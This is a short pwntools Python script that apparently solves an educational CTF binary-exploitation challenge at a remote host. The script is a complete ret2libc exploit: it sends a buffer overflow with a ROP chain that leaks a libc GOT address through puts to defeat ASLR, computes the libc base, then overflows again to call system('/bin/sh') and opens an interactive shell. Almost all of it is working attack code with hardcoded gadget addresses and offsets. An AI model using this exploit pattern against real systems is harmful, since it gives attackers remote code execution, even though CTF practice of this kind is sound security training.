from pwn import *

context.arch = 'amd64'

r = remote('edu-ctf.csie.org', 10175)

pop_rdi = 0x0000000000400733
pop_rsi_r15 = 0x0000000000400731
ret = 0x0000000000400506

# bss = 0x601040
bss = 0x6b6000
gets_plt = 0x400530
puts_plt = 0x400520
libc_start_main_got = 0x600ff0
main = 0x400698

p = flat(
        'a' * 0x38,
        pop_rdi,
        libc_start_main_got,
        puts_plt,
        main
        )

# need to know the random base

r.sendlineafter(':D', p)

# get the output of got leaked content
r.recvline()

# padding to 8 bytes for 64 bits unpack
# randomed - based = randombased offset (libc base ASLR address)
libc = u64(r.recv(6) + '\0\0') - 0x21ab0

# end with ab0
print(hex(libc))

system_offset = 0x4f440
system_func_ptr = libc + system_offset
bin_sh = libc + 0x1b3e9a
# padding to make stack aligned
ret = 0x400506
# jump back to main for system overflow again, find /bin/sh

p = flat(
        'a' * 0x38,
        ret,
        pop_rdi,
        bin_sh,
        system_func_ptr
        )

r.sendlineafter(':D', p)
r.interactive()
